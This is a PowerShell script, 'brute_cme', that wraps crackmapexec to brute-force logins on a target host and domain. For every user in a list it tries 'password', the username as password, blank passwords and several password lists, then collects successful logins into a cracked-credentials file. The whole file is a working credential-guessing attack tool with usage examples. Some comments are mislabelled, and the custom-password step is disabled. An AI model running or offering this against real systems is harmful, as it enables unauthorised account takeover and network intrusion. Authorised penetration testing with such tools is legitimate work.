$name="brute_cme"
$version="1.0"

$ProgressPreference = 'SilentlyContinue'	
$ErrorActionPreference = 'SilentlyContinue'

$global:target=$args[0]
$global:domain=$args[1]
$global:userlist=$args[2]
$global:custompass=$args[3]


if (!$domain) { 
# if no domain is given then set it to a '.' 
$global:domain="."
}

if (!$userlist) { 
$global:userlist="users.txt"
}

function debug {
echo "----------------------------"
echo "target:		$target"
echo "userlist:	$userlist"
echo "domain:		$domain"
echo "custompass:	$custompass"
echo "----------------------------"
}  



function crackmapexec-check-cracked {
Get-Content .\cme_brute.log | findstr [+] | sort-object| Get-Unique > cme_brute_cracked.txt
}

function crackmapexec-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""

# password
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p password | tee -Append .\cme_brute.log }
crackmapexec-check-cracked
}
function crackmapexec-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
# pass5.txt
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p pass5.txt | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}
function crackmapexec-userpass {
Write-Output ""
Write-Output "[+] user = pass "
Write-Output ""
# user = password 
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p $user | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}
function crackmapexec-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
# pass_blank.txt
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p pass_blank.txt | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}
function crackmapexec-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
# pass5.txt
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p pass10.txt | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}
function crackmapexec-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
# pass5.txt
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p pass100.txt | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}
function crackmapexec-custompass {
Write-Output ""
Write-Output "[+] $custompass"
Write-Output ""

# pass5.txt
ForEach ($user in Get-Content $userlist) {.\crackmapexec.exe -d $domain $target -u $user -p $custompass | tee -Append .\cme_brute.log }  
Write-Output ""
crackmapexec-check-cracked
}


function run-crackmapexec {
echo "" > .\cme_brute.log 
crackmapexec-password
crackmapexec-pass5
crackmapexec-userpass
crackmapexec-blank
crackmapexec-pass10
crackmapexec-pass100
#
#if (!$custompass) { 
#crackmapexec-custompass
#}

Get-Content .\cme_brute_cracked.txt


}


if ($target) { 
echo "" > .\crackmapexec_brute.log
debug
run-crackmapexec | Tee crackmapexec_brute.txt
} else {
Write-Host "$name $version" 
Write-Host "============================" 
Write-Host "USEAGE: " 
Write-Host "	./$name.ps1 [IP ADDRESS]"
Write-Host "	./$name.ps1 [IP ADDRESS] [DOMAIN] [USER LIST] [PASS LIST]" 
Write-Host ""
Write-Host "EXAMPLES"
Write-Host "	./$name.ps1 192.168.80.50"
Write-Host "	./$name.ps1 192.168.80.50 INECURE.local" 
Write-Host "	./$name.ps1 172.16.0.10 secure users.txt pass3k.txt" 
Write-Host "" 
Write-Host "POSITIONS"
Write-Host "	1	IP ADDRESS - required! wont run without this" 
Write-Host "	2	DOMAIN - optional - will default to '.'" 
Write-Host "	3	USER LIST - optional - will default to .\users.txt" 
Write-Host "	4	PASS LIST - optional - can give it your own password list to run at the end" 
Write-Host "" 
Write-Host "" 
}



